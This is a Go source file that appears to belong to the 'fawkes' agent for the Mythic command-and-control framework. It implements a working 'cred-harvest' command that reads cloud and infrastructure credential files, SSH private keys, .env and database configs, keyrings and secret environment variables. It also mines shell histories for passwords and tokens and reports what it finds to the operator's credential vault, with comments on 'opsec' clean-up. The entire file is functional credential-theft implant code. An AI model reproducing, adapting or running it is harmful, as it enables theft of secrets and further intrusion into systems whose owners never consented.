package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type CredHarvestCommand struct{}

func (c *CredHarvestCommand) Name() string { return "cred-harvest" }
func (c *CredHarvestCommand) Description() string {
	return "Harvest credentials from shadow, cloud configs, and application secrets (T1552)"
}

type credHarvestArgs struct {
	Action string `json:"action"` // shadow, cloud, configs, windows, all
	User   string `json:"user"`   // Filter by username (optional)
}

func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		actions := "shadow, cloud, configs, history, all"
		if runtime.GOOS == "windows" {
			actions = "cloud, configs, windows, m365-tokens, history, all"
		}
		return errorf("Error: parameters required. Actions: %s", actions)
	}

	var args credHarvestArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Plain text fallback: "shadow", "cloud", "configs", "all", "shadow root"
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.User = parts[1]
		}
	}

	return credHarvestDispatch(args)
}

// Cloud credential file locations — cross-platform
var cloudCredPaths = []struct {
	name    string
	paths   []string
	envVars []string
}{
	{
		name: "AWS",
		paths: []string{
			".aws/credentials",
			".aws/config",
		},
		envVars: []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_PROFILE", "AWS_DEFAULT_REGION"},
	},
	{
		name: "GCP",
		paths: []string{
			".config/gcloud/credentials.db",
			".config/gcloud/access_tokens.db",
			".config/gcloud/application_default_credentials.json",
			".config/gcloud/properties",
		},
		envVars: []string{"GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_PROJECT", "CLOUDSDK_CORE_PROJECT", "GOOGLE_CLOUD_PROJECT"},
	},
	{
		name: "Azure",
		paths: []string{
			".azure/accessTokens.json",
			".azure/azureProfile.json",
			".azure/msal_token_cache.json",
			".azure/clouds.config",
			".azure/service_principal_entries.json",
		},
		envVars: []string{"AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID", "ARM_CLIENT_SECRET"},
	},
	{
		name: "Kubernetes",
		paths: []string{
			".kube/config",
		},
		envVars: []string{"KUBECONFIG", "KUBERNETES_SERVICE_HOST"},
	},
	{
		name: "Helm",
		paths: []string{
			".config/helm/repositories.yaml",
			".config/helm/registry/config.json",
		},
		envVars: []string{"HELM_REGISTRY_CONFIG"},
	},
	{
		name: "Docker",
		paths: []string{
			".docker/config.json",
		},
		envVars: []string{"DOCKER_HOST", "DOCKER_CONFIG", "DOCKER_REGISTRY_TOKEN"},
	},
	{
		name: "GitHub CLI",
		paths: []string{
			".config/gh/hosts.yml",
		},
		envVars: []string{"GITHUB_TOKEN", "GH_TOKEN", "GITHUB_ENTERPRISE_TOKEN"},
	},
	{
		name: "GitLab CLI",
		paths: []string{
			".config/glab-cli/config.yml",
		},
		envVars: []string{"GITLAB_TOKEN", "GITLAB_PRIVATE_TOKEN", "CI_JOB_TOKEN"},
	},
	{
		name: "Terraform",
		paths: []string{
			".terraformrc",
			".terraform.d/credentials.tfrc.json",
		},
		envVars: []string{"TF_VAR_access_key", "TF_VAR_secret_key", "TF_TOKEN_app_terraform_io"},
	},
	{
		name: "Vault (HashiCorp)",
		paths: []string{
			".vault-token",
		},
		envVars: []string{"VAULT_TOKEN", "VAULT_ADDR", "VAULT_ROLE_ID", "VAULT_SECRET_ID"},
	},
	{
		name: "DigitalOcean",
		paths: []string{
			".config/doctl/config.yaml",
		},
		envVars: []string{"DIGITALOCEAN_ACCESS_TOKEN", "DO_API_TOKEN"},
	},
	{
		name: "Heroku",
		paths: []string{
			".netrc",
		},
		envVars: []string{"HEROKU_API_KEY"},
	},
	{
		name: "OpenStack",
		paths: []string{
			".config/openstack/clouds.yaml",
			".config/openstack/clouds-public.yaml",
		},
		envVars: []string{"OS_PASSWORD", "OS_AUTH_URL", "OS_TOKEN"},
	},
	{
		name: "Pulumi",
		paths: []string{
			".pulumi/credentials.json",
		},
		envVars: []string{"PULUMI_ACCESS_TOKEN"},
	},
}

func credCloud(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var creds []structs.MythicCredential

	sb.WriteString("Cloud & Infrastructure Credentials\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	for _, cred := range cloudCredPaths {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cred.name))
		found := false

		for _, home := range homes {
			for _, relPath := range cred.paths {
				path := filepath.Join(home, relPath)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				if info.Size() < 10240 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						structs.ZeroBytes(data) // opsec: clear raw credential file data
						if len(content) > 2000 {
							content = content[:2000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
					}
				}
			}
		}

		for _, env := range cred.envVars {
			if val := os.Getenv(env); val != "" {
				found = true
				display := val
				if len(display) > 40 {
					display = display[:20] + "..." + display[len(display)-10:]
				}
				sb.WriteString(fmt.Sprintf("  [ENV] %s=%s\n", env, display))

				// Report env var credentials to Mythic vault
				creds = append(creds, structs.MythicCredential{
					CredentialType: "plaintext",
					Realm:          cred.name,
					Account:        env,
					Credential:     val,
					Comment:        "cred-harvest cloud env",
				})
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	// Kubernetes in-pod service account token detection
	credCloudK8sServiceAccount(&sb)

	// AWS SSO/CLI cache scanning
	credCloudAWSCache(&sb, homes)

	// GCP service account JSON files
	credCloudGCPServiceAccounts(&sb, homes)

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

func credCloudK8sServiceAccount(sb *strings.Builder) {
	saDir := "/var/run/secrets/kubernetes.io/serviceaccount"
	tokenPath := filepath.Join(saDir, "token")
	if data, err := os.ReadFile(tokenPath); err == nil {
		sb.WriteString("--- Kubernetes Service Account (In-Pod) ---\n")
		sb.WriteString(fmt.Sprintf("  [TOKEN] %s (%d bytes)\n", tokenPath, len(data)))
		token := string(data)
		structs.ZeroBytes(data) // opsec: clear raw token bytes
		if len(token) > 200 {
			token = token[:100] + "..." + token[len(token)-50:]
		}
		sb.WriteString(fmt.Sprintf("  Value: %s\n", token))
		structs.ZeroString(&token) // opsec: clear token string after use

		// Also grab namespace and CA cert
		if ns, err := os.ReadFile(filepath.Join(saDir, "namespace")); err == nil {
			sb.WriteString(fmt.Sprintf("  Namespace: %s\n", strings.TrimSpace(string(ns))))
			structs.ZeroBytes(ns) // opsec: clear K8s namespace data
		}
		if ca, err := os.Stat(filepath.Join(saDir, "ca.crt")); err == nil {
			sb.WriteString(fmt.Sprintf("  CA Cert: %s (%d bytes)\n", filepath.Join(saDir, "ca.crt"), ca.Size()))
		}
		sb.WriteString("\n")
	}
}

func credCloudAWSCache(sb *strings.Builder, homes []string) {
	found := false
	for _, home := range homes {
		// SSO cache
		ssoDir := filepath.Join(home, ".aws", "sso", "cache")
		if entries, err := os.ReadDir(ssoDir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".json") {
					if !found {
						sb.WriteString("--- AWS SSO/CLI Cache ---\n")
						found = true
					}
					path := filepath.Join(ssoDir, entry.Name())
					info, _ := entry.Info()
					if info != nil {
						sb.WriteString(fmt.Sprintf("  [SSO] %s (%d bytes)\n", path, info.Size()))
						if info.Size() < 4096 && info.Size() > 0 {
							if data, err := os.ReadFile(path); err == nil {
								content := string(data)
								structs.ZeroBytes(data) // opsec: clear raw SSO cache data
								if len(content) > 500 {
									content = content[:500] + "..."
								}
								sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
							}
						}
					}
				}
			}
		}

		// CLI cache
		cliDir := filepath.Join(home, ".aws", "cli", "cache")
		if entries, err := os.ReadDir(cliDir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".json") {
					if !found {
						sb.WriteString("--- AWS SSO/CLI Cache ---\n")
						found = true
					}
					path := filepath.Join(cliDir, entry.Name())
					info, _ := entry.Info()
					if info != nil {
						sb.WriteString(fmt.Sprintf("  [CLI] %s (%d bytes)\n", path, info.Size()))
					}
				}
			}
		}
	}
	if found {
		sb.WriteString("\n")
	}
}

func credCloudGCPServiceAccounts(sb *strings.Builder, homes []string) {
	found := false
	for _, home := range homes {
		gcloudDir := filepath.Join(home, ".config", "gcloud")
		if entries, err := os.ReadDir(gcloudDir); err == nil {
			for _, entry := range entries {
				name := entry.Name()
				// Look for service account key files
				if strings.HasSuffix(name, ".json") && name != "properties" {
					if strings.Contains(name, "service_account") || strings.Contains(name, "adc") {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						path := filepath.Join(gcloudDir, name)
						info, _ := entry.Info()
						if info != nil {
							sb.WriteString(fmt.Sprintf("  [KEY] %s (%d bytes)\n", path, info.Size()))
							if info.Size() < 4096 && info.Size() > 0 {
								if data, err := os.ReadFile(path); err == nil {
									content := string(data)
									structs.ZeroBytes(data) // opsec: clear raw GCP service account key data
									if len(content) > 1000 {
										content = content[:1000] + "..."
									}
									sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
								}
							}
						}
					}
				}
			}
		}

		// Legacy credentials directory
		legacyDir := filepath.Join(gcloudDir, "legacy_credentials")
		if entries, err := os.ReadDir(legacyDir); err == nil {
			for _, entry := range entries {
				if entry.IsDir() {
					tokenFile := filepath.Join(legacyDir, entry.Name(), "singlestore_refresh_token")
					if info, err := os.Stat(tokenFile); err == nil {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						sb.WriteString(fmt.Sprintf("  [LEGACY] %s (%d bytes)\n", tokenFile, info.Size()))
					}
					adcFile := filepath.Join(legacyDir, entry.Name(), "adc.json")
					if info, err := os.Stat(adcFile); err == nil {
						if !found {
							sb.WriteString("--- GCP Service Account Keys ---\n")
							found = true
						}
						sb.WriteString(fmt.Sprintf("  [LEGACY] %s (%d bytes)\n", adcFile, info.Size()))
					}
				}
			}
		}
	}
	if found {
		sb.WriteString("\n")
	}
}

// Application config patterns — cross-platform
var configPatterns = []struct {
	name     string
	patterns []string
}{
	{"Environment Files", []string{".env", ".env.local", ".env.production"}},
	{"SSH Private Keys", []string{
		".ssh/id_rsa", ".ssh/id_ecdsa", ".ssh/id_ed25519", ".ssh/id_dsa",
	}},
	{"Git Credentials", []string{
		".git-credentials",
		".gitconfig",
	}},
	{"NPM/Pip/Gem Tokens", []string{
		".npmrc",
		".pypirc",
		".gem/credentials",
	}},
}

func credConfigs(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Application Credentials & Configs\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// Common cross-platform patterns
	allPatterns := configPatterns

	// Add platform-specific patterns
	if runtime.GOOS != "windows" {
		allPatterns = append(allPatterns, struct {
			name     string
			patterns []string
		}{
			"GNOME Keyring", []string{
				".local/share/keyrings/login.keyring",
				".local/share/keyrings/user.keyring",
				".local/share/keyrings/default.keyring",
			},
		})
	}

	// Database config files
	allPatterns = append(allPatterns, struct {
		name     string
		patterns []string
	}{
		"Database Configs", []string{
			"config/database.yml",
			"wp-config.php",
			"settings.py",
			"application.properties",
			"appsettings.json",
			"config.json",
		},
	})

	for _, cfg := range allPatterns {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cfg.name))
		found := false

		for _, home := range homes {
			for _, pattern := range cfg.patterns {
				path := filepath.Join(home, pattern)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				if info.Size() < 4096 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						structs.ZeroBytes(data) // opsec: clear raw config file data
						if len(content) > 1000 {
							content = content[:1000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
					}
				}
			}
		}

		// System-level database configs (Unix only)
		if cfg.name == "Database Configs" && runtime.GOOS != "windows" {
			systemPaths := []string{
				"/etc/mysql/debian.cnf",
				"/etc/postgresql/*/main/pg_hba.conf",
				"/var/lib/mysql/.my.cnf",
				"/etc/redis/redis.conf",
				"/etc/mongod.conf",
			}
			for _, pattern := range systemPaths {
				matches, _ := filepath.Glob(pattern)
				for _, path := range matches {
					info, err := os.Stat(path)
					if err != nil {
						continue
					}
					found = true
					sb.WriteString(fmt.Sprintf("  [SYSTEM] %s (%d bytes)\n", path, info.Size()))
					if info.Size() < 4096 && info.Size() > 0 {
						if data, err := os.ReadFile(path); err == nil {
							lines := strings.Split(string(data), "\n")
							structs.ZeroBytes(data) // opsec: clear raw database config data
							for _, line := range lines {
								lower := strings.ToLower(line)
								if strings.Contains(lower, "password") || strings.Contains(lower, "secret") || strings.Contains(lower, "token") || strings.Contains(lower, "key") {
									sb.WriteString(fmt.Sprintf("    %s\n", strings.TrimSpace(line)))
								}
							}
						}
					}
				}
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}

func credIndentLines(s string, prefix string) string {
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if line != "" {
			lines[i] = prefix + line
		}
	}
	return strings.Join(lines, "\n")
}

// --- Shell History credential extraction ---

// historyCredPattern defines a regex-free pattern for matching credentials in shell history lines.
type historyCredPattern struct {
	// contains is a substring that must be present (case-insensitive) for a fast pre-filter
	contains string
	// category labels the finding type
	category string
	// matchFunc determines if a line matches and extracts the sensitive portion
	matchFunc func(line string) string
}

// historyCredPatterns defines patterns for credential extraction from shell history.
// Order doesn't matter — all matching patterns are reported.
var historyCredPatterns = []historyCredPattern{
	{
		contains: "sshpass",
		category: "SSH Password (sshpass)",
		matchFunc: func(line string) string {
			// sshpass -p 'password' or sshpass -p password
			idx := strings.Index(line, "-p")
			if idx == -1 {
				return ""
			}
			rest := strings.TrimSpace(line[idx+2:])
			if rest == "" {
				return ""
			}
			return extractQuotedOrWord(rest)
		},
	},
	{
		contains: "mysql",
		category: "MySQL Password",
		matchFunc: func(line string) string {
			// mysql -p<password> (no space) or --password=<password>
			if idx := strings.Index(line, "--password="); idx != -1 {
				return extractQuotedOrWord(line[idx+11:])
			}
			// mysql -u user -pPASSWORD (no space after -p, and next char is not a flag)
			idx := strings.Index(line, " -p")
			if idx == -1 {
				return ""
			}
			rest := line[idx+3:]
			if rest == "" || rest[0] == ' ' || rest[0] == '-' {
				return "" // -p with space is interactive prompt, not inline password
			}
			return extractQuotedOrWord(rest)
		},
	},
	{
		contains: "curl",
		category: "HTTP Credential (curl)",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			// curl -u user:pass or --user user:pass
			for _, flag := range []string{" -u ", " --user "} {
				if idx := strings.Index(lower, flag); idx != -1 {
					rest := strings.TrimSpace(line[idx+len(flag):])
					val := extractQuotedOrWord(rest)
					if strings.Contains(val, ":") {
						return val
					}
				}
			}
			// curl -H "Authorization: Bearer <token>"
			if idx := strings.Index(lower, "authorization:"); idx != -1 {
				rest := strings.TrimSpace(line[idx+14:])
				// Take the rest up to the closing quote or EOL
				if end := strings.IndexAny(rest, "\"'"); end != -1 {
					return strings.TrimSpace(rest[:end])
				}
				return extractQuotedOrWord(rest)
			}
			return ""
		},
	},
	{
		contains: "wget",
		category: "HTTP Credential (wget)",
		matchFunc: func(line string) string {
			for _, flag := range []string{"--password=", "--http-password=", "--ftp-password="} {
				if idx := strings.Index(line, flag); idx != -1 {
					return extractQuotedOrWord(line[idx+len(flag):])
				}
			}
			return ""
		},
	},
	{
		contains: "docker login",
		category: "Docker Registry Password",
		matchFunc: func(line string) string {
			for _, flag := range []string{"--password=", "--password ", " -p "} {
				if idx := strings.Index(line, flag); idx != -1 {
					rest := strings.TrimSpace(line[idx+len(flag):])
					return extractQuotedOrWord(rest)
				}
			}
			return ""
		},
	},
	{
		contains: "htpasswd",
		category: "htpasswd Password",
		matchFunc: func(line string) string {
			// htpasswd -b <file> <user> <password>
			if !strings.Contains(line, " -b") && !strings.Contains(line, " -B") {
				return ""
			}
			parts := strings.Fields(line)
			if len(parts) >= 5 {
				return parts[len(parts)-1] // last arg is the password
			}
			return ""
		},
	},
	{
		contains: "psql",
		category: "PostgreSQL Credential",
		matchFunc: func(line string) string {
			// psql postgres://user:pass@host/db
			if idx := strings.Index(line, "://"); idx != -1 {
				rest := line[idx+3:]
				if at := strings.Index(rest, "@"); at != -1 {
					userPass := rest[:at]
					if strings.Contains(userPass, ":") {
						return userPass
					}
				}
			}
			return ""
		},
	},
	{
		contains: "export",
		category: "Exported Secret",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			if !strings.HasPrefix(strings.TrimSpace(lower), "export ") {
				return ""
			}
			// Check if the exported variable name contains sensitive keywords
			sensitiveKeys := []string{"password", "secret", "token", "key", "credential", "passwd", "api_key", "apikey"}
			for _, k := range sensitiveKeys {
				if strings.Contains(lower, k) && strings.Contains(line, "=") {
					// Return the full assignment
					trimmed := strings.TrimSpace(line)
					if idx := strings.Index(trimmed, " "); idx != -1 {
						return strings.TrimSpace(trimmed[idx+1:])
					}
				}
			}
			return ""
		},
	},
	{
		contains: "git clone",
		category: "Git Token",
		matchFunc: func(line string) string {
			// git clone https://<token>@github.com/... or https://user:token@
			if idx := strings.Index(line, "://"); idx != -1 {
				rest := line[idx+3:]
				if at := strings.Index(rest, "@"); at != -1 {
					userToken := rest[:at]
					// Avoid matching just "git" (git@github.com is SSH, not a token)
					if userToken != "git" && len(userToken) > 4 {
						return userToken
					}
				}
			}
			return ""
		},
	},
	{
		contains: "sudo",
		category: "Sudo Password (echo pipe)",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			// echo 'password' | sudo -S ...
			if strings.Contains(lower, "sudo") && strings.Contains(lower, "-s") && strings.Contains(lower, "echo") {
				// Extract the echo argument
				echoIdx := strings.Index(lower, "echo")
				pipeIdx := strings.Index(line[echoIdx:], "|")
				if pipeIdx != -1 {
					echoPart := strings.TrimSpace(line[echoIdx+4 : echoIdx+pipeIdx])
					return extractQuotedOrWord(echoPart)
				}
			}
			return ""
		},
	},
}

// historyFiles defines shell history file paths relative to home directory.
var historyFiles = []struct {
	name     string
	relPaths []string
	parser   func(data []byte) []string // optional custom parser for non-standard formats
}{
	{"Bash", []string{".bash_history"}, nil},
	{"Zsh", []string{".zsh_history", ".zhistory"}, parseZshHistory},
	{"Fish", []string{".local/share/fish/fish_history"}, parseFishHistory},
	{"MySQL", []string{".mysql_history"}, nil},
	{"PostgreSQL", []string{".psql_history"}, nil},
	{"Redis CLI", []string{".rediscli_history"}, nil},
	{"Python", []string{".python_history"}, nil},
	{"Node REPL", []string{".node_repl_history"}, nil},
}

// windowsHistoryFiles defines Windows-specific history file paths (absolute or env-relative).
var windowsHistoryFiles = []struct {
	name    string
	envBase string
	relPath string
}{
	{"PowerShell", "APPDATA", "Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"},
}

// parseZshHistory handles zsh extended history format where lines may start with ": timestamp:0;"
func parseZshHistory(data []byte) []string {
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Strip zsh extended history prefix: ": 1234567890:0;actual command"
		if strings.HasPrefix(line, ": ") {
			if semi := strings.Index(line, ";"); semi != -1 {
				line = line[semi+1:]
			}
		}
		lines = append(lines, line)
	}
	return lines
}

// parseFishHistory handles fish shell history format: "- cmd: <command>"
func parseFishHistory(data []byte) []string {
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "- cmd: ") {
			lines = append(lines, line[7:])
		}
	}
	return lines
}

// extractQuotedOrWord extracts a quoted string ('...' or "...") or the first word from input.
func extractQuotedOrWord(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if s[0] == '\'' || s[0] == '"' {
		quote := s[0]
		end := strings.IndexByte(s[1:], quote)
		if end != -1 {
			return s[1 : end+1]
		}
	}
	// First whitespace-delimited word
	if end := strings.IndexAny(s, " \t"); end != -1 {
		return s[:end]
	}
	return s
}

// historyFinding represents a credential found in a history file.
type historyFinding struct {
	Shell    string
	File     string
	Line     string
	Category string
	Value    string
}

// scanHistoryLines applies credential patterns to history lines and returns findings.
func scanHistoryLines(lines []string, shell, file string) []historyFinding {
	var findings []historyFinding
	seen := make(map[string]bool) // deduplicate identical findings

	for _, line := range lines {
		lower := strings.ToLower(line)
		for _, p := range historyCredPatterns {
			if !strings.Contains(lower, p.contains) {
				continue
			}
			val := p.matchFunc(line)
			if val == "" {
				continue
			}
			key := p.category + "|" + val
			if seen[key] {
				continue
			}
			seen[key] = true
			findings = append(findings, historyFinding{
				Shell:    shell,
				File:     file,
				Line:     line,
				Category: p.category,
				Value:    val,
			})
		}
	}
	return findings
}

// credHistory scans shell history files for leaked credentials.
func credHistory(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var allFindings []historyFinding
	filesScanned := 0

	sb.WriteString("Shell History Credential Scan\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// Scan Unix-style history files
	for _, hf := range historyFiles {
		for _, home := range homes {
			for _, relPath := range hf.relPaths {
				path := filepath.Join(home, relPath)
				data, err := os.ReadFile(path)
				if err != nil {
					continue
				}
				filesScanned++

				var lines []string
				if hf.parser != nil {
					lines = hf.parser(data)
				} else {
					for _, line := range strings.Split(string(data), "\n") {
						line = strings.TrimSpace(line)
						if line != "" {
							lines = append(lines, line)
						}
					}
				}
				structs.ZeroBytes(data) // opsec: clear raw history data

				findings := scanHistoryLines(lines, hf.name, path)
				allFindings = append(allFindings, findings...)
			}
		}
	}

	// Windows PowerShell history
	if runtime.GOOS == "windows" {
		for _, wf := range windowsHistoryFiles {
			base := os.Getenv(wf.envBase)
			if base == "" {
				continue
			}
			path := filepath.Join(base, wf.relPath)
			data, err := os.ReadFile(path)
			if err != nil {
				continue
			}
			filesScanned++

			var lines []string
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" {
					lines = append(lines, line)
				}
			}
			structs.ZeroBytes(data) // opsec: clear raw PowerShell history

			findings := scanHistoryLines(lines, wf.name, path)
			allFindings = append(allFindings, findings...)
		}
	}

	sb.WriteString(fmt.Sprintf("History files scanned: %d\n", filesScanned))
	sb.WriteString(fmt.Sprintf("Credentials found: %d\n\n", len(allFindings)))

	if len(allFindings) == 0 {
		sb.WriteString("No credentials detected in shell history.\n")
		return successResult(sb.String())
	}

	// Group by category
	grouped := make(map[string][]historyFinding)
	var categories []string
	for _, f := range allFindings {
		if _, exists := grouped[f.Category]; !exists {
			categories = append(categories, f.Category)
		}
		grouped[f.Category] = append(grouped[f.Category], f)
	}

	for _, cat := range categories {
		catFindings := grouped[cat]
		sb.WriteString(fmt.Sprintf("--- %s (%d) ---\n", cat, len(catFindings)))
		for _, f := range catFindings {
			redacted := redactValue(f.Value)
			sb.WriteString(fmt.Sprintf("  [%s] %s\n", f.Shell, f.File))
			sb.WriteString(fmt.Sprintf("    Value: %s\n", redacted))
			// Show truncated command for context
			cmd := f.Line
			if len(cmd) > 120 {
				cmd = cmd[:120] + "..."
			}
			sb.WriteString(fmt.Sprintf("    Command: %s\n", cmd))
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}
